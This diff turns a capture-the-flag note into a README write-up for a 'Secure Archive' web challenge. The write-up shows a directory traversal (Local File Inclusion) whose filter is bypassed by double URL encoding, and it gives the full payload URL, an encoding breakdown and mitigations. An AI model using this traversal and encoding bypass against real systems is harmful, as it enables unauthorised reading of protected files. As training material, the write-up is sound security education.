@@ -1,17 +1,82 @@
-CBCTF Qualifying - Secure Archive
+# Secure Archive - Web Security Challenge
 
-LFI with Double Encoding
+## Challenge Information
+- **Category:** Web Application Security
+- **Points:** TBD
+- **Difficulty:** Medium
+- **Target:** https://safearchive.cyberbattle.info/
 
-Blocked parameters:
-../
-flag
-..\ 
+## Challenge Description
+A Local File Inclusion (LFI) vulnerability challenge that tests understanding of URL encoding bypass techniques. The application implements security filters that can be circumvented using double URL encoding.
 
-Single URL decoding will be decoded and flagged
-Double URL decoding will not be flagged
+## Vulnerability Overview
+The web application suffers from a **Local File Inclusion (LFI)** vulnerability with attempted input filtering that can be bypassed through **Double URL Encoding**.
 
-check robots.txt to find the flag.txt folder
+## Security Filters
+The application blocks the following parameters:
+- `../` (directory traversal)
+- `flag` (direct flag access attempts)
+- `..\` (Windows-style directory traversal)
 
+## Filter Bypass Technique
+- **Single URL encoding**: Gets detected and blocked by security filters
+- **Double URL encoding**: Bypasses the security filters successfully
+
+## Solution Process
+
+### Step 1: Reconnaissance
+Check `robots.txt` to discover hidden directories and files:
+```
+https://safearchive.cyberbattle.info/robots.txt
+```
+
+This reveals the location of the flag file in `/secret_data/flag.txt`
+
+### Step 2: Initial Attempt (Blocked)
+Direct attempt using single encoding:
+```
 https://safearchive.cyberbattle.info/view?template=../secret_data/flag&format=txt
+```
+❌ **Result**: Blocked by security filters
 
+### Step 3: Double URL Encoding Bypass
+Apply double URL encoding to bypass filters:
+```
 https://safearchive.cyberbattle.info/view?template=%252E%252E%252F%2573%2565%2563%2572%2565%2574%255F%2564%2561%2574%2561%252F%2566%256C%2561%2567&format=txt
+```
+✅ **Result**: Successfully bypasses filters and retrieves flag
+
+## URL Encoding Breakdown
+```
+Original: ../secret_data/flag
+Single:   ..%2Fsecret_data%2Fflag  
+Double:   %252E%252E%252F%2573%2565%2563%2572%2565%2574%255F%2564%2561%2574%2561%252F%2566%256C%2561%2567
+```
+
+## Key Learning Points
+- **Filter Evasion**: Security filters may only check for single-encoded patterns
+- **Double Encoding**: Encoding already encoded data can bypass detection
+- **Reconnaissance**: Always check `robots.txt` for sensitive file locations
+- **LFI Exploitation**: Directory traversal vulnerabilities allow access to unauthorized files
+
+## Screenshots
+- `1. Homepage.png` - Application homepage
+- `2. Sample Report.png` - Normal application functionality
+- `3. Security In Place.png` - Security filter activation
+- `4. robots.png` - robots.txt discovery
+- `5. Double Encoding.png` - Successful bypass demonstration
+
+## Mitigation
+- Implement proper input validation and sanitization
+- Use whitelist-based filtering instead of blacklist
+- Decode input multiple times before validation
+- Implement proper access controls for sensitive files
+- Avoid direct file inclusion based on user input
+
+## Tools Used
+- Web browser for manual testing
+- URL encoding tools
+- Burp Suite (optional for request manipulation)
+
+## Flag Format
+`CBCTF{...}`
